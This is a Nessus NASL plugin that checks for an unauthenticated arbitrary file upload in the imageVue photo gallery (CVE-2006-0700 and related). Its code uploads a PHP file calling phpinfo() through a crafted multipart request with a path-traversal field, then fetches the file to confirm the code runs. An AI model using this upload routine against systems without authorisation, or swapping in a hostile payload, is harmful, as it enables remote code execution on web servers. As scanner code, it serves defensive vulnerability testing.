#
# (C) Tenable Network Security
#


if (description) {
  script_id(20991);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0700", "CVE-2006-0701", "CVE-2006-0702", "CVE-2006-0703");
  script_bugtraq_id(16594);

  script_name(english:"imageVue < 16.2 Multiple Vulnerabilities");
  script_summary(english:"Checks for unauthorized file upload vulnerability in imageVue");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running imageVue, a web-based photo gallery
application written in PHP. 

The installed version of imageVue allows unauthenticated attackers to
upload arbitrary files, including files containing code which can then
be executed subject to the privileges of the web server user id. 

In addition, it also reportedly affected by information disclosure and
cross-site scripting vulnerabilities. 

See also :

http://www.securityfocus.com/archive/1/424745/30/0/threaded
http://www.imagevuex.com/index.php?p=100&id=9

Solution :

Upgrade to imageVue 16.2 or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";
  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/imagevue", "/imageVue", "/ImageVue", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Get a list of possible folders.
  req = http_get(item:string(dir, "/dir.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like it's from ImageVue...
  if (
    '<?xml version="1.0"' >< res &&
    '<folder path="' >< res
  ) {
    # Find a folder that allows uploads.
    while (res) {
      res = strstr(res, '<folder path="');
      if (res) {
        attr = res - strstr(res, ">");
        folder = ereg_replace(pattern:'^.+ path="([^"]+/)" .+ perm="7.+', replace:"\1", string:attr);
        break;
        res = strstr(res, ">") - ">";
      }
    }

    # Try to upload a file.
    if (folder) {
      file = string(rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_"), "-", unixtime(), ".php");

      boundary = "nessus";
      req = string(
        "POST ",  dir, "/admin/upload.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
        # nb: we'll add the Content-Length header and post data later.
      );
      boundary = string("--", boundary);
      postdata = string(
        boundary, "\r\n",
        'Content-Disposition: form-data; name="uploadFile"; filename="', file, '"', "\r\n",
        "Content-Type: application/x-php\r\n",
        "\r\n",
        "<? phpinfo() ?>\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="getpath"', "\r\n",
        "\r\n",
        "./../", folder, "\r\n",

        boundary, "--", "\r\n"
      );
      req = string(
        req,
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # Finally, try to run the script we just uploaded.
      folder2 = urlencode(
         str:folder,
         unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]/"
      );
      req = http_get(item:string(dir, "/", folder2, file), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if it looks like the output of phpinfo().
      if ("PHP Version" >< res) {
        security_note(port);
      }
    }
  }
}
